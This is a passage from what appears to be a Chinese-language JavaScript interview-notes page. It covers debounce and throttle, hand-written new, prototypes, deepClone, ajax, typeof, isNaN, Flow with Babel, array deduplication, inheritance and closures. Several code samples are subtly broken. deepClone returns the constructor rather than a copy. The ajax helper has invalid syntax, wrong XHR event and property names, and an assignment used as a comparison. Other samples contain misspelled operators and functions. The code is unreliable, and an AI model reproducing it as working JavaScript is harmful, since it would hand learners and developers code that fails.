</code></pre></div><h3 id="debounce和throttle的区别"><a href="#debounce和throttle的区别" class="header-anchor">#</a> debounce和throttle的区别：</h3> <p>其实两个最终的效果是一样的，都是在一定的时间里限制函数只执行一次。</p> <ul><li>debounce：强制函数在某段时间内只执行一次。<code>debounce</code>适用于诸如input事件，当用户输入时需要响应ajax请求，多次input只响应一次回调方法</li> <li>throttle：强制函数以固定的速率执行。<code>throttle</code>适用于resize或者鼠标移动事件或者滚动事件（用debounce也可以）。</li></ul> <h3 id="_8-new"><a href="#_8-new" class="header-anchor">#</a> 8. new</h3> <p>new操作符创建一个自定义的对象类型的实例。</p> <p><strong><code>new</code></strong> 关键字会进行如下的操作：</p> <ol><li>创建一个空的简单JavaScript对象（即 <code>{ }</code>）；</li> <li>设置这个空对象的<code>__proto__</code>为传入的context的原型对象；</li> <li>修改this指向为新创建的对象并传入参数列表，这个新对象就是最后返回的对象，也就是实例对象；</li> <li>如果构造函数没有返回值（一般情况下都没有返回值），则返回实例对象，否则返回构造函数的返回值。</li></ol> <p>手写new的实现：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">myNew</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">let</span> obj<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
   obj<span class="token punctuation">.</span>__proto__<span class="token operator">=</span>context<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
   <span class="token comment">//修改this指向为新对象，就是最后返回的实例对象，并且传入参数，执行了构造函数里面的代码。</span>
   <span class="token keyword">let</span> result<span class="token operator">=</span><span class="token function">context</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token comment">//执行函数的返回值，如果有，返回这个值；如果没有，就返回这个新对象。</span>
   <span class="token keyword">return</span> result instanceOf Object <span class="token operator">?</span> result<span class="token operator">:</span>obj<span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Car</span><span class="token punctuation">(</span><span class="token parameter">made<span class="token punctuation">,</span>model<span class="token punctuation">,</span>year</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>made<span class="token operator">=</span>made<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token operator">=</span>model<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>year<span class="token operator">=</span>year<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> car<span class="token operator">=</span><span class="token function">myNew</span><span class="token punctuation">(</span> Car<span class="token punctuation">,</span><span class="token string">'tesla'</span><span class="token punctuation">,</span><span class="token string">'model3'</span><span class="token punctuation">,</span><span class="token number">2020</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> Car <span class="token punctuation">{</span>mode<span class="token operator">:</span><span class="token string">'tesla'</span><span class="token punctuation">,</span>model<span class="token operator">:</span><span class="token string">'model3'</span><span class="token punctuation">,</span>year<span class="token operator">:</span><span class="token number">2020</span><span class="token punctuation">}</span>
</code></pre></div><p>以上代码实例对象car最后的结构如下:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">{</span>
  made<span class="token operator">:</span><span class="token string">'tesla'</span><span class="token punctuation">,</span>
  model<span class="token operator">:</span><span class="token string">'model3'</span><span class="token punctuation">,</span>
  year<span class="token operator">:</span><span class="token string">'2020'</span><span class="token punctuation">,</span>
  __proto__<span class="token operator">:</span><span class="token punctuation">{</span>
    constructor<span class="token operator">:</span>Car<span class="token punctuation">,</span><span class="token comment">//构造函数Car</span>
    __proto__<span class="token operator">:</span><span class="token punctuation">{</span>
      constructor<span class="token operator">:</span>Object <span class="token comment">//构造函数Object（是的,Object构造函数本身也是个函数，没毛病啊。）</span>
    <span class="token punctuation">}</span>  
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>这里的car是实例对象。实例对象可以有很多个，他们不会互相影响，但是他们的<code>__proto__</code>都指向同一个原型对象，所以他们都是由同一个构造函数实例化而来。他们都继承了同一个构造函数的属性和方法。他们是真兄弟。</p> <p>JS内构的构造函数比如 Function、Object、Array、Date、RegExp、Number、String、Boolean。</p> <h3 id="关于js的原型"><a href="#关于js的原型" class="header-anchor">#</a> 关于JS的原型：</h3> <p>每个实例对象都有<code>__proto__</code>属性，指向为该实例对象的原型对象。直到Object.prototype，当它作为实例对象的时候， 它的原型对象是null，所以它没有<code>__proto__</code>，原型链得以终结。</p> <blockquote><p>为什么不是Object()终结，因为Object构造函数也是函数，函数也是对象。把Object()当成实例对象的时候，它是通过Function new出来的，所以他的<code>__proto__</code>指向Function的原型对象，也就是Function.prototype；把Object()作为原型对象的时候，它自然还有<code>constructor</code>属性，指向它的构造函数，也就是Function()。</p></blockquote> <p>每个原型对象都有<code>constructor</code>属性，指向这个原型对象的构造函数。</p> <p>构造函数有<code>prototype</code>属性，指向该实例对象的原型对象。</p> <p>一个对象，它可能既是自己父亲的实例对象，又是自己孙子的原型对象。</p> <p>这种继承关系就是原型链的魅力嘛。</p> <p>参考资料：</p> <p><a href="https://www.cnblogs.com/xiaohuochai/p/5721552.html" target="_blank" rel="noopener noreferrer">一张图理解prototype、proto和constructor的三角关系<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h3 id="_9-promise"><a href="#_9-promise" class="header-anchor">#</a> 9. promise</h3> <h3 id="_10-deepclone"><a href="#_10-deepclone" class="header-anchor">#</a> 10. deepClone</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>obj<span class="token operator">===</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">!==</span><span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">}</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">RegExp</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">}</span>
  <span class="token keyword">let</span> newObj<span class="token operator">=</span>obj<span class="token punctuation">.</span>constructor<span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_11-currying-柯里化"><a href="#_11-currying-柯里化" class="header-anchor">#</a> 11. currying(柯里化)</h3> <h3 id="_12-ajax"><a href="#_12-ajax" class="header-anchor">#</a> 12. ajax</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span><span class="token parameter">options</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> method<span class="token operator">=</span>options<span class="token punctuation">.</span>method<span class="token operator">||</span><span class="token string">'GET'</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> data<span class="token operator">=</span>options<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token keyword">let</span> params<span class="token operator">=</span>options<span class="token punctuation">.</span>params<span class="token punctuation">;</span>
  <span class="token keyword">let</span> url<span class="token operator">=</span>options<span class="token punctuation">.</span>url<span class="token operator">+</span>params<span class="token operator">?</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token operator">=&gt;</span>key<span class="token operator">+</span><span class="token string">'='</span>params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span> <span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> async<span class="token operator">=</span>options<span class="token punctuation">.</span>async<span class="token operator">===</span><span class="token boolean">false</span><span class="token operator">?</span><span class="token boolean">false</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> success<span class="token operator">=</span>options<span class="token punctuation">.</span>success<span class="token punctuation">;</span>
  <span class="token keyword">let</span> headers<span class="token operator">=</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">;</span>

  <span class="token keyword">let</span> xhr<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span><span class="token punctuation">{</span>
     xhr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    xhr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'Microsoft.XMLHTTP'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onReadyStatusChanged</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyStatus<span class="token operator">===</span><span class="token number">4</span><span class="token operator">&amp;&amp;</span>xhr<span class="token punctuation">.</span>status<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      success<span class="token operator">&amp;&amp;</span><span class="token function">success</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span>url<span class="token punctuation">,</span>async<span class="token punctuation">)</span><span class="token punctuation">;</span>
  Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    xhr<span class="token punctuation">.</span><span class="token function">setRequestHeaders</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>headers<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  data<span class="token operator">?</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">:</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_13-jsonp"><a href="#_13-jsonp" class="header-anchor">#</a> 13.  jsonp</h3> <h3 id="_14-typeof"><a href="#_14-typeof" class="header-anchor">#</a> 14. typeof</h3> <div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function-variable function">typeOf</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>为什么要使用String的slice方法截取字符串的一部分，因为</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">tyoeOf</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token string">'[object Number]'</span>
</code></pre></div><p>String 的slice与数组的类似：slice(start,end)</p> <p>start:包含，如果为负数，-1指的是最后一个字符串的位置，-2指倒数第二个，以此类推</p> <p>end:不包含，如果为负数，-1指的是最后一个字符串的位置，-2指倒数第二个，以此类推。</p> <h3 id="_15-isnan"><a href="#_15-isnan" class="header-anchor">#</a> 15. isNaN</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">var</span> res<span class="token operator">=</span><span class="token function">Number</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token operator">===</span><span class="token string">'NaN'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h2 id="flow"><a href="#flow" class="header-anchor">#</a> Flow</h2> <p>Flow 使用类型接口查找错误，甚至不需要任何类型声明。 它也能够准确地跟踪变量的类型，就像运行时那样。</p> <p>Flow 能在 JS 运行前找出常见的 bug，包括：</p> <ul><li>自动类型转换,</li> <li><code>null</code> 引用,</li> <li>可怕的 <code>undefined is not a function</code>.</li></ul> <p>带有 Flow 类型注解的 JS 代码可以 <a href="https://zhenyong.github.io/flowtype/docs/running.html" target="_blank" rel="noopener noreferrer">简单转化<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 为常规的 JS 代码，所以随处运行</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token comment">// @flow</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
  <span class="token keyword">return</span> x<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token string">'Hello, world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>第一行，我们添加了 <code>// @flow</code>，用来告诉 Flow 你得检查我这个文件。<strong>如果不加这个注释， Flow 就认为这个文件还没准备好，先不检查它</strong></p> <p>Flow 虽然给出了类型错误提示，但是它不会禁止代码运行。当然，按照最佳实践， 如果有类型错误的话就绝不发布，不过在开发阶段，即便还没完美解决 Flow 的提醒，你还是会经常运行代码的（ 特别是 调试/随机测试 ）。这就是 <a href="https://en.wikipedia.org/wiki/Gradual_typing" target="_blank" rel="noopener noreferrer">Gradual typing<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 的好处之一，Flow 的设计如此，让你在开发期间，不受到任何耽误</p> <h3 id="运行flow代码"><a href="#运行flow代码" class="header-anchor">#</a> 运行Flow代码</h3> <p>因为类型注解不是 Js 规范的一部分，所以我们得移除它，建议使用 <a href="http://babeljs.io/" target="_blank" rel="noopener noreferrer">Babel<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 。</p> <p>安装 Babel 命令行工具：</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">npm</span> <span class="token function">install</span> -g babel-cli
</code></pre></div><p>安装 Flow 转换器 <code>babel-plugin-transform-flow-strip-types</code>，添加一个 <code>.babelrc</code> 文件到项目根目录，用来告诉 Babel 要 移除 Flow 注解：</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token builtin class-name">cd</span> /path/to/my/project

<span class="token function">mkdir</span> -p node_modules <span class="token operator">&amp;&amp;</span> <span class="token function">npm</span> <span class="token function">install</span> babel-plugin-transform-flow-strip-types

<span class="token builtin class-name">echo</span> <span class="token string">'{&quot;plugins&quot;: [&quot;transform-flow-strip-types&quot;]}'</span> <span class="token operator">&gt;</span> .babelrc
</code></pre></div><p>使用 <code>babel</code> 命令，在后台启动转换器</p> <div class="language-shell extra-class"><pre class="language-shell"><code>babel --watch<span class="token operator">=</span>./src --out-dir<span class="token operator">=</span>./build
</code></pre></div><p>这样子babel 会在后台运行，当发现 <code>src/</code> 目录下的文件改变时， 就会创建相应的正常的 Js 版本，保存在 <code>build/</code> 目录下</p> <h2 id="数组去重的n种写法"><a href="#数组去重的n种写法" class="header-anchor">#</a> 数组去重的n种写法</h2> <p>参考资料：</p> <p><a href="https://www.jb51.net/article/159785.htm" target="_blank" rel="noopener noreferrer">文章<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ol><li><p>Set</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">unique</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><p>filter</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>unique<span class="token operator">-</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span>index</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token operator">===</span>index<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><p>includes</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">unique</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>result<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result
<span class="token punctuation">}</span>
</code></pre></div></li></ol> <h2 id="js实现继承的几种方法"><a href="#js实现继承的几种方法" class="header-anchor">#</a> JS实现继承的几种方法</h2> <p>参考资料：</p> <p><a href="https://blog.csdn.net/ruirui_1996/article/details/78595952" target="_blank" rel="noopener noreferrer"> 博客文章<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ol><li>原型继承</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">B</span><span class="token punctuation">.</span>prototype<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span> <span class="token comment">//私有+公有都会继承</span>
</code></pre></div><ol start="2"><li>call继承</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token constant">A</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只继承私有</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> b<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
</code></pre></div><p>3.冒充对象继承</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> temp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> temp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">//私有+公有</span>
    <span class="token keyword">this</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  temp<span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> b<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
</code></pre></div><p>4.混合模式继承</p> <p>私有的继承了两遍</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token constant">A</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//继承私有</span>
<span class="token punctuation">}</span>
<span class="token class-name">B</span><span class="token punctuation">.</span>prototype<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span> <span class="token comment">//私有+公有都会继承</span>
<span class="token keyword">let</span> b<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
</code></pre></div><p>5.寄生组合继承（ES6的继承<code>extends</code>采用的方式）</p> <p>私有的继承私有的</p> <p>公有的继承共有的</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token constant">A</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">B</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//IE6-8中不兼容Object.create()</span>
</code></pre></div><h2 id="什么是闭包和闭包的用途"><a href="#什么是闭包和闭包的用途" class="header-anchor">#</a> 什么是闭包和闭包的用途</h2> <p><strong>什么是闭包</strong></p> <p>变量的作用域有两种：全局变量和局部变量；函数内部可以直接读取全局变量；在函数外部无法读取函数内的局部变量。
